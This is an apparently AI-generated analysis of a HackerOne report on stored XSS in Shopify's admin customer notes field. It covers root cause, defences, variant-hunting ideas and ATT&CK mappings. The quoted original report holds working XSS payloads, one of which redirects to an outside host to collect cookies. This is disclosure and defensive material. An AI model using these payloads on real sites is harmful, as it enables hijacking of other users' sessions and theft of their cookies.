# Stored XSS in Customer Notes Field

## Metadata
- **Source:** HackerOne
- **Report:** 798599 | https://hackerone.com/reports/798599
- **Submitted:** 2020-02-18
- **Reporter:** davscol94
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS) - Stored, Insufficient Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the customer notes field of Shopify's admin panel that allows authenticated users to inject malicious HTML/JavaScript code. When other admin users view the customer record, the payload executes in their browser context, potentially leading to session hijacking and cookie theft.

## Attack scenario
1. Attacker with admin access navigates to /admin/customers section
2. Attacker locates a customer record and accesses the notes field
3. Attacker injects malicious payload containing JavaScript (e.g., window.location redirect or alert(document.cookie))
4. Payload is stored in the database without proper sanitization
5. Other admin users view the compromised customer record
6. Malicious JavaScript executes in the context of legitimate admin's session, exfiltrating cookies or redirecting to attacker-controlled phishing domain

## Root cause
The customer notes field lacks proper input validation and output encoding. The application stores raw HTML/JavaScript without sanitization and renders it without escaping special characters, allowing script execution in victim browsers.

## Attacker mindset
An insider threat or compromised low-privilege admin account could plant XSS payloads to escalate privileges by stealing cookies from higher-privileged admins, or perform lateral movement within the Shopify ecosystem. The attacker demonstrates awareness of DOM-based XSS vectors and cookie exfiltration techniques.

## Defensive takeaways
- Implement strict input validation on all user-supplied fields, especially those displayed to other users
- Apply contextual output encoding (HTML entity encoding) when rendering user-controlled content
- Use Content Security Policy (CSP) headers to restrict inline script execution and external resource loading
- Implement a robust HTML sanitization library (e.g., DOMPurify, bleach) for fields that require HTML formatting
- Enforce principle of least privilege for admin access to notes fields
- Add audit logging for modifications to sensitive customer data fields
- Implement subresource integrity and restrict javascript: protocol in href attributes
- Use HttpOnly and Secure flags on session cookies to limit XSS impact

## Variant hunting
Similar XSS in other admin-accessible user input fields (order notes, product descriptions, customer contact info)
Reflected XSS variants if user input is echoed in error messages or search results
DOM-based XSS if client-side JavaScript processes customer notes without sanitization
Test other Shopify admin sections: products, inventory, shipping address, billing notes
Check for CSRF protection bypass when combined with XSS for automated exploitation
Verify if notes field accepts file uploads or references (XXE attacks)

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter (JavaScript)
- T1041 - Exfiltration Over C2 Channel
- T1056 - Input Capture (cookie stealing)
- T1087 - Account Discovery
- T1021 - Remote Services (lateral movement via stolen admin session)

## Notes
Report lacks details on bounty amount and Shopify's response timeline. The PoC demonstrates both cookie exfiltration and malicious redirect techniques. The vulnerability requires authentication but affects information security of multiple admin users. The nested anchor tag structure suggests fuzzing or bypassing initial filter attempts. Proper severity assessment requires understanding Shopify's admin privilege model and data sensitivity.

## Full report
<details><summary>Expand</summary>

Se encuentra un xss en las notas del cliente se requiere inicio de session, se encuentra en el campo notas de cliente

POC

https://macken22jorg.myshopify.com/admin/customers
https://macken22jorg.myshopify.com/admin/customers/2901321318444


<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:alert(document.cookie)" onmouseover="javascript:alert(document.cookie)">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhh

<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:window.location='https://growncheckerworl.com/cookie.php?cookie=document.cookie'" >aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhhk



Referencias:

https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/

## Impact

captura de cookies

</details>

---
*Analysed by Claude on 2026-05-12*
